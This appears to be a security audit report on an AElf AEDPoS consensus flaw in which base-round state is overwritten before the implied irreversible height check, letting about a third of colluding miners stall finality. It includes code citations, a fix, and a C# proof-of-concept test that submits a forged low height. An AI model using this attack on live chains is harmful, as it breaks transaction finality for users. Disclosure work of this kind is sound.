# Audit Report

## Title
Ineffective ImpliedIrreversibleBlockHeight Validation Enables Last Irreversible Block Stalling Attack

## Summary
A critical order-of-operations flaw in the AEDPoS consensus validation logic renders the `ImpliedIrreversibleBlockHeight` validation ineffective. The `RecoverFromUpdateValue` method modifies the base round's state before validation occurs, causing the validation check to always pass. This allows malicious miners controlling approximately 1/3 of mining power to permanently stall Last Irreversible Block (LIB) advancement, breaking the blockchain's finality guarantee.

## Finding Description

The vulnerability exists in the validation flow where validation logic is executed in the wrong order. In the `ValidateBeforeExecution` method, the base round is modified by calling `RecoverFromUpdateValue` before the `LibInformationValidationProvider` performs its validation check. [1](#0-0) 

The `RecoverFromUpdateValue` method overwrites the base round's `ImpliedIrreversibleBlockHeight` with the value provided by the miner: [2](#0-1) 

The validation context is then created with this already-modified base round: [3](#0-2) 

Subsequently, the `LibInformationValidationProvider` is added to validate the LIB information: [4](#0-3) 

The validation logic compares the now-modified base round against the provided round: [5](#0-4) 

Since both `baseRound` and `providedRound` now contain identical `ImpliedIrreversibleBlockHeight` values after recovery, the condition `baseRound.ImpliedIrreversibleBlockHeight > providedRound.ImpliedIrreversibleBlockHeight` always evaluates to false, allowing any value to bypass validation.

Honest miners set this value to the current block height when generating consensus data: [6](#0-5) 

However, malicious miners can provide arbitrarily low values. During execution, this malicious value is stored directly in the state: [7](#0-6) 

The LIB calculation retrieves sorted implied heights and selects the value at position `(count-1)/3`: [8](#0-7) 

When approximately 1/3 of miners report low values, the calculated LIB becomes lower than the current confirmed LIB. A safeguard prevents LIB from decreasing: [9](#0-8) 

However, this same safeguard prevents LIB from advancing when `libHeight <= currentRound.ConfirmedIrreversibleBlockHeight`, causing permanent LIB stalling without any recovery mechanism.

## Impact Explanation

This represents a **CRITICAL** severity issue due to fundamental consensus failure:

**Core Finality Breach:**
- The LIB mechanism is fundamental to blockchain finality. When LIB stops advancing, no new blocks become irreversible, breaking the core security guarantee that transactions become final.
- Users and applications cannot obtain finality guarantees for their transactions, rendering high-value operations unsafe.

**Cross-Chain Operations Failure:**
- Cross-chain operations depend on LIB for security verification. Stalled LIB renders all cross-chain transfers, merkle proof verification, and parent/side-chain synchronization inoperable.
- This affects AElf's entire multi-chain architecture.

**Systemic Availability Impact:**
- The attack causes a permanent denial-of-service on the finality mechanism while block production continues normally, making detection difficult initially.
- No automatic recovery mechanism exists; manual intervention or hard fork would be required.
- Long-term stalling fundamentally damages protocol trust and adoption.

This breaks a fundamental consensus invariant with cascading failures across all protocol layers requiring finality guarantees.

## Likelihood Explanation

The attack likelihood is **HIGH** due to:

**Low Attack Barrier:**
- The attack requires control of approximately 1/3 of active miners, which is within the standard Byzantine fault tolerance threshold the system is designed to handle.
- Attack complexity is minimal: miners only need to modify their node to report a constant low value (e.g., 1) instead of `Context.CurrentHeight`.
- No special permissions beyond being an authorized miner are required.

**Lack of Defenses:**
- No economic disincentives or slashing mechanisms exist for reporting anomalous implied heights.
- No monitoring or detection mechanism identifies miners reporting anomalous values.
- The validation that should prevent this is completely ineffective due to the order-of-operations flaw.

**Detection Challenges:**
- The attack is difficult to detect initially as block production continues normally.
- Only becomes apparent when finality-dependent operations start failing.

The probability is HIGH because the attack is trivial to implement, requires only standard BFT-threshold collusion (1/3 miners), and has no barriers to execution.

## Recommendation

Fix the order-of-operations by performing validation BEFORE modifying the base round:

```csharp
private ValidationResult ValidateBeforeExecution(AElfConsensusHeaderInformation extraData)
{
    // Get current round information
    if (!TryToGetCurrentRoundInformation(out var baseRound))
        return new ValidationResult { Success = false, Message = "Failed to get current round information." };

    // Create validation context with UNMODIFIED base round
    var validationContext = new ConsensusValidationContext
    {
        BaseRound = baseRound,  // Original, unmodified base round
        ProvidedRound = extraData.Round,  // Provided round from miner
        CurrentTermNumber = State.CurrentTermNumber.Value,
        CurrentRoundNumber = State.CurrentRoundNumber.Value,
        PreviousRound = TryToGetPreviousRoundInformation(out var previousRound) ? previousRound : new Round(),
        LatestPubkeyToTinyBlocksCount = State.LatestPubkeyToTinyBlocksCount.Value,
        ExtraData = extraData,
        SenderPubkey = extraData.SenderPubkey.ToHex()
    };

    // Perform ALL validations on unmodified state
    var validationProviders = new List<IHeaderInformationValidationProvider>
    {
        new MiningPermissionValidationProvider(),
        new TimeSlotValidationProvider(),
        new ContinuousBlocksValidationProvider()
    };

    switch (extraData.Behaviour)
    {
        case AElfConsensusBehaviour.UpdateValue:
            validationProviders.Add(new UpdateValueValidationProvider());
            validationProviders.Add(new LibInformationValidationProvider());
            break;
        // ... other cases
    }

    var service = new HeaderInformationValidationService(validationProviders);
    var validationResult = service.ValidateInformation(validationContext);

    if (validationResult.Success == false)
        return validationResult;

    // ONLY after validation passes, recover/modify the base round
    if (extraData.Behaviour == AElfConsensusBehaviour.UpdateValue)
        baseRound.RecoverFromUpdateValue(extraData.Round, extraData.SenderPubkey.ToHex());

    if (extraData.Behaviour == AElfConsensusBehaviour.TinyBlock)
        baseRound.RecoverFromTinyBlock(extraData.Round, extraData.SenderPubkey.ToHex());

    return validationResult;
}
```

Additionally, update `LibInformationValidationProvider` to accept both base and provided rounds separately in the validation context, ensuring it always validates against the original unmodified state.

## Proof of Concept

```csharp
[Fact]
public async Task LibStalling_Attack_ProofOfConcept()
{
    // Initialize consensus with multiple miners
    InitializeContracts();
    await InitializeCandidates(7); // 7 miners for demonstration
    
    // Mine first round normally to establish baseline
    var firstRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    var initialLib = firstRound.ConfirmedIrreversibleBlockHeight;
    
    // Simulate normal mining for one complete round
    foreach (var miner in firstRound.RealTimeMinersInformation.Values.OrderBy(m => m.Order).Take(5))
    {
        var keyPair = InitialCoreDataCenterKeyPairs.First(k => k.PublicKey.ToHex() == miner.Pubkey);
        KeyPairProvider.SetKeyPair(keyPair);
        BlockTimeProvider.SetBlockTime(miner.ExpectedMiningTime);
        
        var tester = GetAEDPoSContractStub(keyPair);
        var triggerInfo = new AElfConsensusTriggerInformation
        {
            Pubkey = ByteString.CopyFrom(keyPair.PublicKey),
            InValue = HashHelper.ComputeFrom("test"),
            Behaviour = AElfConsensusBehaviour.UpdateValue
        };
        
        var headerInfo = (await AEDPoSContractStub.GetConsensusExtraData.CallAsync(
            triggerInfo.ToBytesValue())).ToConsensusHeaderInformation();
        
        var updateInput = headerInfo.Round.ExtractInformationToUpdateConsensus(
            miner.Pubkey, ByteString.CopyFrom(await GenerateRandomProofAsync(keyPair)));
        
        // Verify honest miner sets ImpliedIrreversibleBlockHeight to current height
        updateInput.ImpliedIrreversibleBlockHeight.ShouldBe(Context.CurrentHeight);
        
        await tester.UpdateValue.SendAsync(updateInput);
    }
    
    // Now malicious miners (>= 1/3) report LOW implied heights
    var maliciousMinerCount = 3; // 3 out of 7 is ~43% (> 1/3 threshold)
    var maliciousMiners = firstRound.RealTimeMinersInformation.Values.OrderBy(m => m.Order).Skip(5).Take(maliciousMinerCount);
    
    foreach (var miner in maliciousMiners)
    {
        var keyPair = InitialCoreDataCenterKeyPairs.First(k => k.PublicKey.ToHex() == miner.Pubkey);
        KeyPairProvider.SetKeyPair(keyPair);
        BlockTimeProvider.SetBlockTime(miner.ExpectedMiningTime);
        
        var tester = GetAEDPoSContractStub(keyPair);
        var triggerInfo = new AElfConsensusTriggerInformation
        {
            Pubkey = ByteString.CopyFrom(keyPair.PublicKey),
            InValue = HashHelper.ComputeFrom("test"),
            Behaviour = AElfConsensusBehaviour.UpdateValue
        };
        
        var headerInfo = (await AEDPoSContractStub.GetConsensusExtraData.CallAsync(
            triggerInfo.ToBytesValue())).ToConsensusHeaderInformation();
        
        var updateInput = headerInfo.Round.ExtractInformationToUpdateConsensus(
            miner.Pubkey, ByteString.CopyFrom(await GenerateRandomProofAsync(keyPair)));
        
        // ATTACK: Malicious miner reports low ImpliedIrreversibleBlockHeight
        updateInput.ImpliedIrreversibleBlockHeight = 1; // Arbitrarily low value
        
        // This should be rejected but passes due to validation bug
        var result = await tester.UpdateValue.SendAsync(updateInput);
        result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined); // VALIDATION BYPASSED!
    }
    
    // Verify LIB is now stalled
    var finalRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    var finalLib = finalRound.ConfirmedIrreversibleBlockHeight;
    
    // LIB should have advanced but remains at initial value due to attack
    finalLib.ShouldBe(initialLib); // ATTACK SUCCESS: LIB did not advance
    
    // Continue mining more rounds - LIB remains permanently stalled
    await BootMinerChangeRoundAsync();
    var laterRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    laterRound.ConfirmedIrreversibleBlockHeight.ShouldBe(initialLib); // Still stalled!
}
```

## Notes

The vulnerability is confirmed through direct code analysis showing:

1. The validation order-of-operations flaw at [10](#0-9) 

2. The ineffective validation logic at [5](#0-4) 

3. The LIB calculation vulnerability at [8](#0-7) 

This is a fundamental flaw in the consensus validation architecture that breaks the blockchain's finality guarantee. The attack requires only standard Byzantine fault tolerance threshold (1/3 miners) and has no defense mechanisms or recovery paths.

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L46-82)
```csharp
        if (extraData.Behaviour == AElfConsensusBehaviour.UpdateValue)
            baseRound.RecoverFromUpdateValue(extraData.Round, extraData.SenderPubkey.ToHex());

        if (extraData.Behaviour == AElfConsensusBehaviour.TinyBlock)
            baseRound.RecoverFromTinyBlock(extraData.Round, extraData.SenderPubkey.ToHex());

        var validationContext = new ConsensusValidationContext
        {
            BaseRound = baseRound,
            CurrentTermNumber = State.CurrentTermNumber.Value,
            CurrentRoundNumber = State.CurrentRoundNumber.Value,
            PreviousRound = TryToGetPreviousRoundInformation(out var previousRound) ? previousRound : new Round(),
            LatestPubkeyToTinyBlocksCount = State.LatestPubkeyToTinyBlocksCount.Value,
            ExtraData = extraData
        };

        /* Ask several questions: */

        // Add basic providers at first.
        var validationProviders = new List<IHeaderInformationValidationProvider>
        {
            // Is sender in miner list (of base round)?
            new MiningPermissionValidationProvider(),

            // Is this block produced in proper time?
            new TimeSlotValidationProvider(),

            // Is sender produced too many blocks at one time?
            new ContinuousBlocksValidationProvider()
        };

        switch (extraData.Behaviour)
        {
            case AElfConsensusBehaviour.UpdateValue:
                validationProviders.Add(new UpdateValueValidationProvider());
                // Is confirmed lib height and lib round number went down? (Which should not happens.)
                validationProviders.Add(new LibInformationValidationProvider());
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Recover.cs (L19-19)
```csharp
        minerInRound.ImpliedIrreversibleBlockHeight = providedInformation.ImpliedIrreversibleBlockHeight;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/LibInformationValidationProvider.cs (L23-30)
```csharp
        if (providedRound.RealTimeMinersInformation.ContainsKey(pubkey) &&
            providedRound.RealTimeMinersInformation[pubkey].ImpliedIrreversibleBlockHeight != 0 &&
            baseRound.RealTimeMinersInformation[pubkey].ImpliedIrreversibleBlockHeight >
            providedRound.RealTimeMinersInformation[pubkey].ImpliedIrreversibleBlockHeight)
        {
            validationResult.Message = "Incorrect implied lib height.";
            return validationResult;
        }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_GetConsensusBlockExtraData.cs (L118-118)
```csharp
        updatedRound.RealTimeMinersInformation[pubkey].ImpliedIrreversibleBlockHeight = Context.CurrentHeight;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L248-248)
```csharp
        minerInRound.ImpliedIrreversibleBlockHeight = updateValueInput.ImpliedIrreversibleBlockHeight;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L272-281)
```csharp
            if (currentRound.ConfirmedIrreversibleBlockHeight < libHeight)
            {
                Context.LogDebug(() => $"New lib height: {libHeight}");
                Context.Fire(new IrreversibleBlockFound
                {
                    IrreversibleBlockHeight = libHeight
                });
                currentRound.ConfirmedIrreversibleBlockHeight = libHeight;
                currentRound.ConfirmedIrreversibleBlockRoundNumber = currentRound.RoundNumber.Sub(1);
            }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_LIB.cs (L24-32)
```csharp
            var minedMiners = _currentRound.GetMinedMiners().Select(m => m.Pubkey).ToList();
            var impliedIrreversibleHeights = _previousRound.GetSortedImpliedIrreversibleBlockHeights(minedMiners);
            if (impliedIrreversibleHeights.Count < _currentRound.MinersCountOfConsent)
            {
                libHeight = 0;
                return;
            }

            libHeight = impliedIrreversibleHeights[impliedIrreversibleHeights.Count.Sub(1).Div(3)];
```
